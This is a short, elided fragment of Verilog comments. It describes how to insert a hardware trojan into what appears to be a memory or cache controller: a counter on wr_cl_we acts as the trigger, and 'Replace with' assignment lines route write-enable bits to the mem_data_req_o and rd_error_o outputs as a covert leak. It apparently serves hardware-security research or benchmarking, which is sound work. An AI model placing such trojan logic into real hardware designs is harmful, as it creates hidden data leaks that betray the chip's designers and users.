 ...
 *   
 * Trigger: Counter on wr_cl_we
 * Payload: Route mem_data_req_o[0] to observable output
 * 
...
//   Replace with:
//     assign mem_data_req_o = trojan_active ? wr_cl_we[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? wr_cl_we[0] : 1'b0;
//
